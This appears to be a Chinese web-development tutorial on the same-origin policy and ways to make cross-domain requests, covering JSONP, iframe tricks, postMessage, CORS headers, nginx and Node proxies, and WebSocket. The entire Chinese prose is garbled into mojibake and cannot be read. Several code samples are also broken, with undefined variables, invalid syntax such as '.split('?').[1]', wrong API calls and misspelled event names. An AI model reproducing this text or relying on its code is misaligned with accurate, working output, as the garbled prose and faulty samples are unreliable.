ç›®çš„ä¿è¯äº†ç”¨æˆ·çš„ä¿¡æ¯å®‰å…¨ï¼Œé˜²æ­¢æ¶æ„çš„ç½‘ç«™åŽ»çªƒå–æ•°æ®ï¼ŒAç½‘ç«™æ˜¯ä¸€å®¶é“¶è¡Œï¼Œç”¨æˆ·ç™»å½•åŽå°±åŽ»æµè§ˆå…¶ä»–çš„ç½‘ç«™ï¼Œå¦‚æžœå…¶ä»–ç½‘ç«™å¯ä»¥è¯»Aç½‘ç«™çš„cookieï¼Œè€Œcookieå¾€å¾€ç”¨æ¥ä¿å­˜ç”¨æˆ·çš„ç™»å½•çŠ¶æ€ï¼Œå¦‚æžœç”¨æˆ·æ²¡æœ‰é€€å‡ºç™»å½•ï¼Œå…¶ä»–ç½‘ç«™å°±å¯ä»¥å†’å……ç”¨æˆ·ï¼Œä¸ºæ‰€æ¬²ä¸ºï¼Œæµè§ˆå™¨è¿˜è§„å®šï¼Œæäº¤è¡¨å•ä¸å—ä¸åŒæºæ”¿ç­–çš„å½±å“ã€‚ é™åˆ¶çš„èŒƒå›´1.cookieã€LocalStorage å’Œ IndexDBæ— æ³•è¯»å–2.DOM æ— æ³•èŽ·å–3.AJAXè¯·æ±‚æ— æ³•å‘é€ å¸¸è§è·¨åŸŸåœºæ™¯1234567891011121314151617181920URL è¯´æ˜Ž æ˜¯å¦è¿è¡Œé€šä¿¡http://www.domain.com/a.js åŒä¸€ä¸ªåŸŸåï¼Œä¸åŒæ–‡ä»¶è·¯å¾„ è¿è¡Œhttp://www.domain.com/b.jshttp://www.domain.com/lab/c.jshttp://www.domain.com:8000/a.js åŒä¸€åŸŸåï¼Œä¸åŒç«¯å£ ä¸å…è®¸http://www.domain.com/b.js http://www.domain.com/a.js åŒä¸€åŸŸåï¼Œä¸åŒåè®® ä¸å…è®¸https://www.domain.com/a.jshttp://www.domain.com/a.js åŸŸåå’ŒåŸŸåå¯¹åº”çš„ipç›¸åŒ ä¸å…è®¸https://192.168.4.12/b.jshttp://www.domain.com/a.js ä¸»åŸŸç›¸åŒï¼Œå­åŸŸä¸åŒ ä¸å…è®¸http://x.domain.com/b.jshttp://domain.com/c.jshttp://www.domain1.com/a.js ä¸åŒåŸŸå è¿è¡Œhttp://www.domain2.com/b.js è·¨åŸŸè§£å†³æ–¹æ¡ˆ é€šè¿‡ jsonpè·¨åŸŸ document.domain+iframeè·¨åŸŸ location.hash+iframeè·¨åŸŸ postMessageè·¨åŸŸ window.name+iframeè·¨åŸŸ è·¨èµ„æºå…±äº«ï¼ˆCORSï¼‰ nginxä»£ç†è·¨åŸŸ nodejsä¸­é—´ä»¶ä»£ç†è·¨åŸŸ webSocketåè®®è·¨åŸŸ è¯¦è§£é€šè¿‡ jsonp è·¨åŸŸé€šå¸¸ä¸ºäº†å‡è½» web æœåŠ¡å™¨çš„è´Ÿè½½ï¼Œæˆ‘ä»¬æŠŠ js/css/img ç­‰é™æ€èµ„æºåˆ†ç¦»åˆ°å¦ä¸€å°ç‹¬ç«‹åŸŸåçš„æœåŠ¡å™¨ä¸Šï¼Œåœ¨ html é¡µé¢ä¸­å†é€šè¿‡ç›¸åº”çš„æ ‡ç­¾ä»Žä¸åŒåŸŸåä¸‹åŠ è½½é™æ€èµ„æºï¼Œè€Œè¢«æµè§ˆå™¨å…è®¸ï¼ŒåŸºäºŽæ­¤åŽŸç†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åŠ¨æ€åˆ›å»º scriptï¼Œå†è¯·æ±‚ä¸€ä¸ªå¸¦å‚ç½‘å€å®žçŽ°è·¨åŸŸé€šä¿¡ã€‚ åŽŸç”Ÿå®žçŽ° 1234567891011let script = document.createElement('script');script.type = 'text/javascript';// ä¼ å‚ä¸€ä¸ªå›žè°ƒå‡½æ•°åŽç»™åŽç«¯ï¼Œæ–¹ä¾¿åŽç«¯è¿”å›žæ—¶å€™æ‰§è¡Œè¿™ä¸ªåœ¨å‰ç«¯å®šä¹‰çš„å›žè°ƒå‡½æ•°script.src = 'http://www.domain2.com:8080/login?user=admin&amp;callback=handleCallback';document.head.appendChild(script);// å›žè°ƒæ‰§è¡Œå‡½æ•°function handleCallback(res)&#123; console.log(JSON.stringify(res));&#125; æœåŠ¡ç«¯è¿”å›žå¦‚ä¸‹ï¼ˆè¿”å›žæ—¶å³æ‰§è¡Œå…¨å±€å‡½æ•°ï¼‰ 1handleCallback(&#123;status:true,user:admin&#125;) jquery ajax å®žçŽ° 1234567$.ajax(&#123; url:'http://www.domain2.com:8080/login', type:'get', dataType:'jsonp', jsonpCallback:'handleCallback', data:&#123;&#125;&#125;) vue.js å®žçŽ° 123456this.$http.jsonp('http://www.domain2.com:8080/login',&#123; params:&#123;&#125;, jsonp:'handleCallback',&#125;).then(res =&gt;&#123; console.log(res)&#125;) åŽç«¯ node.js 12345678910111213141516let querystring = require('querystring');let http = require('http');let server = http.createServer();server.on('request',function(req,res)&#123; let params = qs.parse(req.url.split('?').[1]) let fn = params.callback; // jsonp è¿”å›žè®¾ç½® res.writeHead(200,&#123;Content-Type;'text/javascript'&#125;) res.write(`($&#123;JSON.stringify(params)&#125;)`) res.send()&#125;)server.listen('8080');console.log('server is running at port 8080') jsonpç¼ºç‚¹ï¼šåªèƒ½å®žçŽ° get ä¸€ç§è¯·æ±‚ã€‚ document.domain + iframe è·¨åŸŸæ­¤æ–¹æ¡ˆä»…é™ä¸»åŸŸç›¸åŒï¼Œå­åŸŸä¸åŒçš„è·¨åŸŸåº”ç”¨åœºæ™¯ å®žçŽ°åŽŸç†ï¼šä¸¤ä¸ªé¡µé¢éƒ½é€šè¿‡ js å¼ºåˆ¶è®¾ç½® document.domainä¸ºåŸºç¡€ä¸»åŸŸï¼Œå°±å®žçŽ°äº†ä¸»åŸŸã€‚ çˆ¶çª—å£ï¼šhttp://www.domain.com/a.html 12345&lt;iframe id='iframe' src="http://www.child.domain.com/b.html"&gt;&lt;/iframe&gt;&lt;script&gt; document.domain = 'domain.com' var user = 'admin';&lt;/script&gt; å­çª—å£ï¼šhttp://child.domain.com/b.html 1234&lt;script&gt; document.domain = 'domain.com' console.log(window.parent.user)&lt;/script&gt; location.hash + iframe è·¨åŸŸå®žçŽ°åŽŸç†ï¼ša æƒ³è·Ÿ b è·¨åŸŸç›¸äº’é€šä¿¡ï¼Œé€šè¿‡ä¸­é—´é¡µ c æ¥å®žçŽ°ï¼Œä¸‰ä¸ªé¡µé¢ï¼Œä¸åŒåŸŸä¹‹é—´åˆ©ç”¨ iframe çš„ location.hash ä¼ å€¼ï¼Œç›¸åŒåŸŸä¹‹é—´é€šè¿‡ js è®¿é—®æ¥é€šä¿¡ å…·ä½“å®žçŽ°ï¼š Aï¼ša.html -&gt; Bï¼šb.html -&gt; Aï¼šc.html a ä¸Ž b ä¸åŒåŸŸåªèƒ½é€šè¿‡ hash å€¼å•å‘é€šä¿¡ï¼Œb ä¸Ž c ä¸åŒåŸŸåä¹Ÿåªèƒ½å•å‘é€šä¿¡ï¼Œä½† c ä¸Ž a åŒåŸŸï¼Œæ‰€ä»¥ c å¯ä»¥é€šè¿‡ parent.parentè®¿é—® a é¡µé¢çš„æ‰€æœ‰å¯¹è±¡ a.htmlï¼šhttp://www.domain1.com/a.html 123456789101112&lt;iframe id="iframe" src="http://www.domain2.com/b.html" style="display:none"&gt;&lt;/iframe&gt;&lt;script&gt; let iframe = document.getElementById('iframe') // å‘ b.html ä¼  hash setTimeout(function()&#123; iframe.src = iframe.src + '#user=admin'; &#125;,1000) // å¼€å§‹ç»™åŒåŸŸ c.html çš„å›žè°ƒæ–¹æ³• function onCallback(res)&#123; console.log(res) &#125;&lt;/script&gt; b.htmlï¼šhttp://www.domain1.com/c.html 123456&lt;script&gt; // ç›‘å¬ b.html ä¼ æ¥çš„ hash å€¼ï¼Œå†ä¼ ç»™ c.html window.onhashchange = function()&#123; iframe.src = iframe.src + location.hash &#125;&lt;/script&gt; c.htmlï¼šhttp://www.domain1.com/c.html 1234567&lt;script&gt; // ç›‘å¬ b.html ä¼ æ¥çš„ hash å€¼ window.onhashchange = function()&#123; // å†é€šè¿‡æ“ä½œåŒåŸŸ a.html çš„jså›žè°ƒï¼Œå°†ç»“æžœè¿”å›ž window.parent.parent.onCallback(location.hash.replace('#user=','')) &#125;&lt;/script&gt; window.name + iframe è·¨åŸŸwindow.name å±žæ€§çš„ç‹¬ç‰¹ä¹‹å¤„ï¼šname å€¼åœ¨ä¸åŒé¡µé¢ï¼ˆç”šè‡³ä¸åŒåŸŸåï¼‰åŠ è½½åŽä¾æ—§å­˜åœ¨ï¼Œå¹¶ä¸”å¯ä»¥æ”¯æŒéžå¸¸é•¿æ›´å¤š name å€¼ï¼ˆ2MBï¼‰ a.htmlï¼šhttp://www.domain1.com/a.html 1234567891011121314151617181920212223242526272829let proxy = function(url,callback)&#123; let state = 0; let iframe = document.createElement('iframe'); // åŠ è½½è·¨åŸŸé¡µé¢ iframe.src = url; // onload äº‹ä»¶ä¼šè§¦å‘2æ¬¡ï¼Œç¬¬ä¸€æ¬¡åŠ è½½è·¨åŸŸé¡µï¼Œå¹¶ç•™å­˜æ•°æ®äºŽ window.name iframe.onload = function()&#123; if(state === 1)&#123; // ç¬¬ 2 æ¬¡ onload æˆåŠŸåŽï¼Œè¯»å–åŒåŸŸ window.name ä¸­æ•°æ® callback(iframe.contentWindow.name) destoryFrame(); &#125;else if(state === 0)&#123; iframe.contentWindow.location = 'http://www.domain1.com/proxy.html' state = 1; &#125; &#125; document.body.appendChild(iframe) // èŽ·å–æ•°æ®åŽé”€æ¯å’Œè¿™ä¸ª iframeï¼Œé‡Šæ”¾å†…å­˜ï¼Œè¿™ä¹Ÿä¿è¯äº†å®‰å…¨ï¼ˆä¸è¢«å…¶ä»– iframe js è®¿é—®ï¼‰ function destoryFrame()&#123; iframe.contentWindow.document.write(''); iframe.contentWindow.close(); document.body.removeChild(iframe); &#125;&#125;proxy('http://www.domain2.com/b.html',function(data)&#123; console.log(data);&#125;) proxy.htmlï¼šhttp://www.domain1.com/proxy.html ä¸­é—´ä»£ç†é¡µï¼Œä¸Ž a.html åŒåŸŸï¼Œå†…å®¹ä¸ºç©ºå³å¯ã€‚ b.htmlï¼šhttp://www.domain2.com/b.html 123&lt;script&gt; window.name = 'This is domain2 data!'&lt;/script&gt; é€šè¿‡ iframe çš„ src å±žæ€§ç”±å¤–åŸŸè½¬å‘æœ¬åœ°åŸŸï¼Œè·¨åŸŸæ•°æ®å³ç”± iframe çš„ window.name ä»Žå¤–åŸŸä¼ é€’åˆ°æœ¬åœ°åŸŸã€‚è¿™ä¸ªå°±æ˜¯å·§å¦™ç»•è¿‡äº†æµè§ˆå™¨çš„è·¨åŸŸè®¿é—®é™åˆ¶ï¼Œä½†åŒæ—¶å®ƒåˆæ˜¯å®‰å…¨æ“ä½œã€‚ postMessage è·¨åŸŸpostMessage æ˜¯ HTML5 XMLHttpRequest Level 2 ä¸­çš„ API,ä¸”æ˜¯ä¸ºæ•°ä¸å¤šçš„å¯ä»¥è·¨åŸŸæ“ä½œçš„ window å±žæ€§ä¹‹ä¸€ï¼Œå®ƒå¯ä»¥ç”¨äºŽè§£å†³ä¸‹é¢çš„é—®é¢˜ï¼š é¡µé¢å’Œå…¶æ‰“å¼€çš„æ–°çª—å£çš„æ•°æ®ä¼ é€’ å¤šçª—å£ä¹‹é—´æ¶ˆæ¯ä¼ é€’ é¡µé¢ä¸ŽåµŒå¥—çš„ iframe æ¶ˆæ¯ä¼ é€’ ä¸Šé¢ä¸‰ä¸ªåœºæ™¯çš„è·¨æ•°æ®ä¼ é€’ ç”¨æ³•ï¼š postMessage(data,origin) æ–¹æ³•æŽ¥å—ä¸¤ä¸ªå‚æ•° dataï¼šhtml5 è§„èŒƒæ”¯æŒä»»æ„åŸºæœ¬ç±»åž‹æˆ–è€…å¯å¤åˆ¶çš„å¯¹è±¡ï¼Œä½†éƒ¨åˆ†æµè§ˆå™¨åªæ”¯æŒå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥ä¼ å‚æ—¶æœ€å¥½ä½¿ç”¨ JSON.stringifyåºåˆ—åŒ– originï¼šåè®®+ä¸»æœº+ç«¯å£å·ï¼Œå¯ä»¥é…ç½®ä¸º â€œ*â€,è¡¨ç¤ºå¯ä»¥ä¼ é€’ä»»æ„çš„çª—å£ï¼Œå¦‚æžœè¦æŒ‡å®šå’Œå½“å‰çš„çª—å£åŒæºçš„è¯è®¾ç½®ä¸º â€œ/â€œ a.htmlï¼šhttp://www.domain1.com/a.html 123456789101112131415&lt;iframe id="iframe" src="http://www.domain2.com/b.html" style="display:none"&gt;&lt;/iframe&gt;&lt;script&gt; let iframe =document.getElementById('iframe'); iframe.onload = function()&#123; let data = &#123; name:'haha' &#125; // å‘ domain2 ä¼ é€è·¨åŸŸæ•°æ® iframe.contentWindow.postMessage(JSON.stringify(data),'http://www.domain2.com') &#125; // æŽ¥å— domain2 è¿”å›žæ•°æ® window.addEventListener('message',function(e)&#123; console.log(e.data) &#125;,false);&lt;/script&gt; b.htmlï¼šhttp://www.domain2.com/b.html 123456789101112&lt;script&gt; // æŽ¥å— domain1 çš„æ•°æ® window.addEventListener('message',function(e)&#123; console.log(e.data) let data = JSON.parse(e.data) if(data)&#123; data.number = 16; // å¤„ç†å®Œä¹‹åŽå†å‘é€ç»™ domain1 window.parent.postMessage(JSON.stringify(data),'http://www.domain1.com') &#125; &#125;,false);&lt;/script&gt; è·¨åŸŸèµ„æºå…±äº«ï¼ˆCORSï¼‰æ™®é€šè·¨åŸŸè¯·æ±‚ï¼šæœåŠ¡ç«¯è®¾ç½® Access-Control-Allow-Originå³å¯ï¼Œå‰ç«¯æ— éœ€è®¾ç½®ï¼Œè‹¥è¦å¸¦ cookie è¯·æ±‚ï¼šå‰åŽç«¯éƒ½éœ€è¦è®¾ç½®ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼šç”±äºŽåŒæºç­–ç•¥çš„é™åˆ¶ï¼Œæ‰€è¦è¯»å–çš„ cookie ä¸ºè·¨åŸŸè¯·æ±‚æŽ¥å£æ‰€åœ¨åŸŸåçš„ cookieï¼Œè€Œéžå½“å‰é¡µã€‚ ç›®å‰ï¼Œä¸»æµçš„æµè§ˆå™¨éƒ½æ”¯æŒè¯¥åŠŸèƒ½ï¼ˆIE8+/9 éœ€è¦ä½¿ç”¨ XDomainRequestå¯¹è±¡æ¥æ”¯æŒ CORSï¼‰ï¼ŒCORS ä¹Ÿå·²ç»æˆä¸ºä¸»æµçš„è·¨åŸŸè§£å†³æ–¹æ¡ˆ å‰ç«¯è®¾ç½®åŽŸç”Ÿ ajax: 12// å‰ç«¯è®¾ç½®æ˜¯å¦å¸¦ cookiexhr.withCredentials = true; 1234567891011var xhr = new XMLHttpRequest(); // IE8/9 éœ€è¦ä½¿ç”¨ window.XDomainRequest å…¼å®¹// å‰ç«¯è®¾ç½®æ˜¯å¦å¸¦æœ‰ cookiexhr.withCredentials = true;xhr.open('post','http://www.domain2.com:8080/login',true);xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('user=admin');xhr.onreadystatechange = function()&#123; if(xhr.readyState == 4 &amp;&amp; xhr.status == 200)&#123; console.log(xhr.responseText); &#125;&#125; jquery ajax 123456$.ajax(&#123; xhrFields:&#123; withCredentials:true // å‰ç«¯æ˜¯å¦å¸¦ cookie &#125;, crossDomain:true // ä¼šè®©è¯·æ±‚å¤´ä¸­å™¶åšæ¶µè·¨åŸŸçš„é¢å¤–ä¿¡æ¯ï¼Œä½†ä¸ä¼šåŒ…å« cookie&#125;) axios 1axios.defaults.withCredentials = true æœåŠ¡ç«¯è®¾ç½®java åŽç«¯ï¼š 123456// å…è®¸è·¨åŸŸè®¿é—®çš„åŸŸåï¼šè‹¥æœ‰ç«¯å£éœ€è¦å†™å…¨ï¼ˆåè®®+åŸŸå+ç«¯å£ï¼‰ï¼Œè‹¥æ²¡æœ‰ç«¯å£ç»“å°¾ä¸ç”¨åŠ  '/'response.setHeader('Access-Control-Allow-Origin','http://www.domain1.com');// å…è®¸å‰ç«¯å¸¦è®¤è¯ cookie:å¯ç”¨æ­¤é¡¹åŽä¸Šé¢çš„åŸŸåä¸èƒ½ä¸º "*"ï¼Œå¿…é¡»æŒ‡å®šå…·ä½“çš„åŸŸåï¼Œå¦åˆ™æµè§ˆå™¨ä¼šæœ‰æç¤ºresponse.setHeader('Access-Control-Allow-Credentials','true');// æç¤º OPTIONS é¢„æ£€æ—¶ï¼ŒåŽç«¯éœ€è¦è®¾ç½®çš„ä¸¤ä¸ªå¸¸ç”¨è‡ªå®šå¤´response.setHeader('Access-Control-Allow-Headers','Content-Type,X-Requested-With') Node.js åŽç«¯ï¼š 12345678910111213141516171819202122232425262728const http = require('http');const server = http.createServer();const qs = require('querystring');server.on('request',(req,res)=&gt;&#123; let postData = ''; // æ•°æ®å—æŽ¥æ”¶ä¸­ req.addListener('data',(chunk)=&gt;&#123; postData +=chunk; &#125;) // æ•°æ®å—æŽ¥æ”¶å®Œæ¯• req.addListener('end',()=&gt;&#123; postData = qs.parse(postData); // è·¨åŸŸåŽå°è®¾ç½® res.writeHead(200,&#123; 'Access-Control-Allow-Credentials':'true', // åŽç«¯å…è®¸å‘é€ cookie 'Access-Control-Allow-Origin':'http://www.domain1.com', // å…è®¸è®¿é—®çš„åŸŸï¼ˆåè®®+åŸŸå+ç«¯å£ï¼‰ /* * æ­¤å¤„è®¾ç½®çš„cookieè¿˜æ˜¯domain2çš„è€Œéždomain1ï¼Œå› ä¸ºåŽç«¯ä¹Ÿä¸èƒ½è·¨åŸŸå†™cookie(nginxåå‘ä»£ç†å¯ä»¥å®žçŽ°)ï¼Œ * ä½†åªè¦domain2ä¸­å†™å…¥ä¸€æ¬¡cookieè®¤è¯ï¼ŒåŽé¢çš„è·¨åŸŸæŽ¥å£éƒ½èƒ½ä»Ždomain2ä¸­èŽ·å–cookieï¼Œä»Žè€Œå®žçŽ°æ‰€æœ‰çš„æŽ¥å£éƒ½èƒ½è·¨åŸŸè®¿é—® */ 'Set-Cookie':'l=a123456;Path=/;Domain=www.domain2.com;HttpOnly' // HttpOnlyçš„ä½œç”¨æ˜¯è®©jsæ— æ³•è¯»å–cookie &#125;) res.write(JSON.stringify(postData)) res.end(); &#125;)&#125;).listen('8080'); nginx ä»£ç†è·¨åŸŸnginx é…ç½®è§£å†³ iconfont è·¨åŸŸ æµè§ˆå™¨è·¨åŸŸè®¿é—® js/css/img ç­‰å¸¸è§„é™æ€èµ„æºè¢«åŒæºç­–ç•¥è®¸å¯ï¼Œä½† iconfont å­—ä½“æ–‡ä»¶ï¼ˆeot|otf|ttf|woff|svgï¼‰é™¤å¤–ï¼Œæ­¤æ—¶å¯åœ¨ nginx çš„é™æ€èµ„æºæœåŠ¡å™¨ä¸­åŠ å…¥ä»¥ä¸‹é…ç½® 123location / &#123; add_header Access-Control-Allow-Origin:*;&#125; nginx åå‘ä»£ç†æŽ¥å£è·¨åŸŸ è·¨åŸŸåŽŸç†ï¼šåŒæºç­–ç•¥æ˜¯æµè§ˆå™¨çš„å®‰å…¨ç­–ç•¥ï¼Œä¸æ˜¯ HTTP åè®®çš„ä¸€éƒ¨åˆ†ã€‚æœåŠ¡ç«¯è°ƒç”¨ HTTP æŽ¥å£åªæ˜¯ä½¿ç”¨ HTTP åè®®ï¼Œä¸ä¼šæ‰§è¡Œ JS è„šæœ¬ï¼Œä¸éœ€è¦åŒæºç­–ç•¥ï¼Œä¹Ÿå°±ä¸å­˜åœ¨è·¨åŸŸé—®é¢˜ã€‚ å®žçŽ°æ€è·¯ï¼šé€šè¿‡ nginx é…ç½®ä¸€ä¸ªä»£ç†æœåŠ¡å™¨ï¼ˆåŸŸåä¸Ž domain1ç›¸åŒï¼Œç«¯å£ä¸åŒï¼‰åšè·³æ¿æœºï¼Œåå‘ä»£ç†è®¿é—® domain2 æŽ¥å£ï¼Œå¹¶ä¸”å¯ä»¥é¡ºä¾¿ä¿®æ”¹ cookie ä¸­çš„ domain ä¿¡æ¯ï¼Œæ–¹ä¾¿å½“å‰åŸŸ cookie å†™å…¥ï¼Œå®žçŽ°è·¨åŸŸç™»å½•ã€‚ nginx å…·ä½“é…ç½®ï¼š 12345678910111213server&#123; listen 81; server_name www.domain1.com location / &#123; proxy_pass http://www.domain2.com:8080, proxy_cookie_domain www.domain2.com www.domain1.com index index.html index.htm add_header Access-Control-Allow-Origin http://www.domain1.com add_header Access-Control-Credentials true &#125;&#125; å‰ç«¯ä»£ç ï¼š 123456const xhr = new XMLHttpRequest();xhr.withCredentials = true;xhr.open('get','http://www.domain1.com:81/?user=admin',true)xhr.send(); Node åŽå°å®žä¾‹ï¼š 12345678910111213141516const http = require('http');const server = http.createServer();const qs = require('querystring');server.on('request',(req,res)=&gt;&#123; const params = qs.parse(req.url.substring(2)) res.writeHead(200,&#123; 'Set-cookie':'l+a123456;Path=/;Domain=www.domain2.com;HttpOnly' &#125;); res.write(JSON.stringify(params)) res.send();&#125;);server.listen('8080')console.log('server is running at port 8080'); Nodejs ä¸­é—´ä»¶ä»£ç†è·¨åŸŸnode ä¸­é—´ä»¶å®žçŽ°è·¨åŸŸä»£ç†ï¼ŒåŽŸç†å¤§è‡´ä¸Ž nginx ç›¸åŒï¼Œéƒ½æ˜¯é€šè¿‡ä¸€ä¸ªä»£ç†æœåŠ¡å™¨ï¼Œå®žçŽ°æ•°æ®çš„è½¬å‘ï¼Œä¹Ÿå¯ä»¥é€šè¿‡è®¾ç½® cookieDomainRewrite å‚æ•°ä¿®æ”¹å“åº”å¤´ä¸­çš„ cookie ä¸­åŸŸåï¼Œè¯•ä¸‹ä½ å½“å‰åŸŸçš„ cookie å†™å…¥ï¼Œæ–¹ä¾¿æŽ¥å£ç™»å½•è®¤è¯ã€‚ éž vue æ¡†æž¶çš„ è·¨åŸŸï¼ˆ2æ¬¡è·¨åŸŸï¼‰ node+express+http-proxy-middleware æ­å»ºä¸€ä¸ª proxy æœåŠ¡å™¨ å‰ç«¯ä»£ç ï¼š 123456const xhr = new XMLHttpRequest();xhr.WithCredentials = true;xhr.open('get','http://www.domain1.com:3000/login?user=admin',true);xhr.send(); ä¸­é—´ä»¶æœåŠ¡å™¨ï¼š 1234567891011121314151617181920const express = require('express');const proxy = require('http-proxy-middleware');const app = new express();app.use('/',proxy(&#123; // ä»£ç†è·¨åŸŸæŽ¥å£ç›®æ ‡ target:'http://www.domain2.com:8080', changeOrigin:true, // ä¿®æ”¹å“åº”å¤´ä¿¡æ¯ï¼Œå®žçŽ°è·¨åŸŸå¹¶å…è®¸å¸¦ cookie onProxyRes:function(proxyRes,req,res)&#123; res.header('Access-Control-Allow-Origin','http://www.domain1.com') res.header('Access-Control-Allow-Credentials','true') &#125;, // ä¿®æ”¹å“åº”ä¿¡æ¯ä¸­çš„ cookie åŸŸå cookieDomainRewrite:'www.domain1.com' // å¯ä»¥ä¸º falseï¼Œè¡¨ç¤ºä¸ä¿®æ”¹&#125;))app.listen(3000)console.log('Proxy server is listen at port 3000...'); vue æ¡†æž¶çš„è·¨åŸŸï¼ˆ1æ¬¡è·¨åŸŸï¼‰ node +webpack+webpack-dev-server ä»£ç†æŽ¥å£è·¨åŸŸã€‚åœ¨å¼€å‘çŽ¯å¢ƒä¸‹ï¼Œç”±äºŽ vue æ¸²æŸ“æœåŠ¡å’ŒæŽ¥å£ä»£ç†æœåŠ¡éƒ½æ˜¯ webpack-dev-server åŒä¸€ä¸ªï¼Œæ‰€ä»¥é¡µé¢ä¸Žä»£ç†æŽ¥å£ä¹‹é—´ä¸å†è·¨åŸŸï¼Œæ— éœ€è®¾ç½® headers è·¨åŸŸä¿¡æ¯ã€‚ webpack.config.js 123456789101112131415module.exports = &#123; entry:&#123;&#125;, module:&#123;&#125;, devSever:&#123; historyApiFallback:true, proxy:[&#123; context:'/login', target:'http://www.domain2.com:8080', changeOrigin:true, secure:false, cookieDomainRewrite:'www.domain1.com' &#125;], noInfo:true &#125;&#125; WebSocket åè®®è·¨åŸŸwebsocket protocol æ˜¯ HTML5 ä¸€ç§æ–°çš„åè®®ï¼Œå®ƒå®žçŽ°äº†æµè§ˆå™¨ä¸ŽæœåŠ¡å™¨å…¨åŒå·¥é€šä¿¡ï¼ŒåŒæ—¶è¿è¡Œè·¨åŸŸé€šè®¯ï¼Œæ˜¯ server push æŠ€æœ¯çš„ä¸€ç§å¾ˆå¥½çš„å®žçŽ°ã€‚ è¿™é‡Œä½¿ç”¨äº† socket.ioï¼Œå®ƒå¾ˆå¥½åœ°å°è£…äº† webSocket çš„æŽ¥å£ï¼Œæä¾›äº†æ›´æ–¹ä¾¿ã€çµæ´»çš„æŽ¥å£ï¼Œä¹Ÿå¯¹ä¸æ”¯æŒ webSocket çš„æµè§ˆå™¨æä¾›äº†å‘ä¸‹å…¼å®¹ã€‚ å‰ç«¯ä»£ç ï¼š 1234567891011121314151617181920&lt;div&gt;user input: &lt;input type="text"&gt;&lt;/div&gt;&lt;script src="https://cdn.bootcss.com/socket.io/2.2.0/socket.io.js"&gt;&lt;/script&gt;&lt;script&gt; const socket = io('http://www.domain2.com:8080'); socket.on('connect',function()&#123; // ç›‘å¬æœåŠ¡ç«¯ä¿¡æ¯ socket.on('message',function(msg)&#123; console.log(msg) &#125;) // ç›‘å¬æœåŠ¡ç«¯å…³é—­ socket.on('disconnect',function()&#123; console.log('server socket has closed.'); &#125;) &#125;) document.getElementByTagName('input')[0].onblur = function()&#123; socket.send(this.value); &#125;;&lt;/script&gt; NodeJs socket åŽå°ï¼š 1234567891011121314151617181920212223242526const http = require('http');const socket = require('socket.io');const server = http.createServer((req,res)=&gt;&#123; res.writeHead(200,&#123; 'Content-type':'text/html' &#125;) res.send();&#125;)server.listen('8080');console.log('Server is running at port 8080');// ç›‘å¬ socket è¿žæŽ¥socket.listen(server).on('connnection',function(client)&#123; // æŽ¥å—ä¿¡æ¯ client.on('message',function(msg)&#123; client.send(msg); console.log(msg); &#125;) // æ–­å¼€å¤„ç† client.on('disconnect',function()&#123; console.log('client socket has closed') &#125;)&#125;); æ—§çš„æ•´ç†Cookiecookieæ˜¯æœåŠ¡å™¨å†™å…¥æµè§ˆå™¨çš„ä¸€å°æ®µä¿¡æ¯ï¼Œåªæœ‰åŒæºçš„ç½‘é¡µæ‰å¯ä»¥å…±äº«ï¼Œä½†æ˜¯å¦‚æžœä¸¤ä¸ªç½‘é¡µçš„ä¸€çº§åŸŸåç›¸åŒï¼Œåªæ˜¯äºŒçº§åŸŸåä¸åŒï¼Œæµè§ˆå™¨å…è®¸é€šè¿‡è®¾ç½® document.domain æ¥å…±äº«Cookie. A:http://w1.example.con/a.htmlB:http://w2.example.com/b.html é‚£ä¹ˆåªè¦è®¾ç½®ç›¸åŒçš„document.domainå°±å¯ä»¥å…±äº«cookieäº† document.domain = â€˜example.comâ€™ åœ¨Aç½‘é¡µè®¾ç½®ä¸€ä¸ªcookie document.cookie = â€œtest = hello â€œ Bç½‘é¡µå°±å¯ä»¥è¯»åˆ°è¿™ä¸ªCookie var allCookie = document.cookie; è¿™ç§æ–¹å¼åªé€‚ç”¨äºŽCookieå’Œiframeçª—å£ï¼ŒLocalStorageå’ŒIndexDBæ— æ³•é€šè¿‡è¿™ç§æ–¹æ³•ï¼Œè§„èŒƒåŒæºç­–ç•¥è¦ä½¿ç”¨PostMessage API,å¦å¤–åœ¨è®¾ç½®Cookieçš„æ—¶å€™ï¼Œè¦æŒ‡å®šCookieçš„æ‰€å±žåŸŸåä¸ºä¸€çº§åŸŸåï¼Œæ¯”å¦‚.example.comã€‚ Set-Cookie: key=value; domain=.example.com; path=/ è¿™æ ·çš„è¯ï¼ŒäºŒçº§åŸŸåå’Œä¸‰çº§åŸŸåä¸ç”¨åšä»»ä½•è®¾ç½®ï¼Œéƒ½å¯ä»¥è¯»å–è¿™ä¸ªCookieã€‚ iframeå¦‚æžœä¸¤ä¸ªç½‘é¡µä¸åŒæºï¼Œå°±æ— æ³•æ‹¿åˆ°å¯¹æ–¹çš„DOMï¼Œå…¸åž‹çš„ä¾‹å­æ˜¯iframeçª—å£å’Œwindow.openæ–¹æ³•æ‰“å¼€çš„çª—å£ï¼Œå®ƒä»¬ä¸Žçˆ¶çª—å£æ²¡æœ‰åŠžæ³•é€šä¿¡ã€‚ document.getElementById(â€œmyIFrameâ€).contentWindow.document// Uncaught DOMException: Blocked a frame from accessing a cross-origin frame. ä¸Šé¢å‘½ä»¤ä¸­ï¼Œçˆ¶çª—å£æƒ³èŽ·å–å­çª—å£çš„DOMï¼Œå› ä¸ºè·¨æºå¯¼è‡´æŠ¥é”™ã€‚åä¹‹äº¦ç„¶ï¼Œå­çª—å£èŽ·å–ä¸»çª—å£çš„DOMä¹Ÿä¼šæŠ¥é”™ã€‚ window.parent.document.body// æŠ¥é”™ å¦‚æžœä¸¤ä¸ªçª—å£ä¸€çº§åŸŸåç›¸åŒï¼Œåªæ˜¯äºŒçº§åŸŸåä¸åŒï¼Œé‚£ä¹ˆè®¾ç½®ä¸Šä¸€èŠ‚ä»‹ç»çš„document.domainå±žæ€§ï¼Œå°±å¯ä»¥è§„é¿åŒæºæ”¿ç­–ï¼Œæ‹¿åˆ°DOMã€‚å¯¹äºŽå®Œå…¨ä¸åŒæºçš„ç½‘ç«™ï¼Œç›®å‰æœ‰ä¸‰ç§æ–¹æ³•ï¼Œå¯ä»¥è§£å†³è·¨åŸŸçª—å£çš„é€šä¿¡é—®é¢˜ã€‚ï¼ˆ1ï¼‰ç‰‡æ®µè¯†åˆ«ç¬¦ï¼ˆfragment 